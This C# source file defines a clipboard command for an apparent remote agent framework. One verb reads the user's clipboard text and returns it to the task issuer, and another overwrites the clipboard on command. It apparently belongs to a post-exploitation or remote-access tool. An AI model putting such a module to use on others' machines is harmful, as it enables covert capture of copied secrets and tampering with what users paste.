using Agent;
using Agent.Commands;
using Agent.Commands.Services;
using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Commands
{
    public class ClipCommand : ServiceCommand
    {
        public override CommandId Command => CommandId.Clip;

        public override bool Threaded => false;
        protected override void RegisterVerbs()
        {
            base.RegisterVerbs();
            this.Register(CommandVerbs.Push, this.Push);
        }

        protected override async Task Show(AgentTask task, AgentCommandContext context)
        {
            if (ClipBoardContainsText())
            {
                context.AppendResult("Clipboard Content : " + Environment.NewLine + GetClipBoardText());
                return;
            }

            context.AppendResult("No text in clipboard !");
        }

        [STAThread]
        public static bool ClipBoardContainsText()
        {

            var obj = Clipboard.GetDataObject();
            return Clipboard.ContainsText(TextDataFormat.Text) || Clipboard.ContainsText(TextDataFormat.UnicodeText) || Clipboard.ContainsText(TextDataFormat.CommaSeparatedValue) || Clipboard.ContainsText(TextDataFormat.Html) || Clipboard.ContainsText(TextDataFormat.Rtf) ||
                Clipboard.ContainsData(DataFormats.Text) ||
                Clipboard.ContainsData(DataFormats.Palette) ||
                Clipboard.ContainsData(DataFormats.CommaSeparatedValue) ||
                Clipboard.ContainsData(DataFormats.Locale) ||
                Clipboard.ContainsData(DataFormats.UnicodeText) ||
                Clipboard.ContainsData(DataFormats.Locale) ||
                Clipboard.ContainsData(DataFormats.Bitmap) ||
                Clipboard.ContainsData(DataFormats.Dib) ||
                Clipboard.ContainsData(DataFormats.SymbolicLink) 
                ;
        }

        [STAThread]
        public static string GetClipBoardText()
        {
            return Clipboard.GetText(TextDataFormat.Text);
        }

        protected async Task Push(AgentTask task, AgentCommandContext context)
        {
            task.ThrowIfParameterMissing(ParameterId.Value);
            
            Clipboard.SetText(task.GetParameter<string>(ParameterId.Value));

            context.AppendResult($"Clipboard updated!");
        }
    }
}
